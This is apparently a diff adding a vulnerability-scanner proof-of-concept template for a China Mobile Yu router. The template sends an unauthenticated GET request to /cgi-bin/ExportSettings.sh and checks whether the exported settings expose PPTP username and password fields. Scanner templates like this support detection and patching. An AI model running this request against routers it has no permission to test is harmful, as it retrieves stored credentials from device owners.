@@ -1,0 +1,19 @@
+name: poc-yaml-china-mobile-yu-router-information-disclosure
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /cgi-bin/ExportSettings.sh
+            follow_redirects: false
+        expression: response.status == 200 && "#The following line must not be removed.".bmatches(response.body) && "wan_pptp_user".bmatches(response.body) && "wan_pptp_pass".bmatches(response.body)
+expression: r0()
+detail:
+    author: cr7(https://github.com/ascar-ascar)
+    links:
+        - https://www.linuxlz.com/aqld/2341.html
+    vulnerability:
+        id: CT-446242
+        level: medium
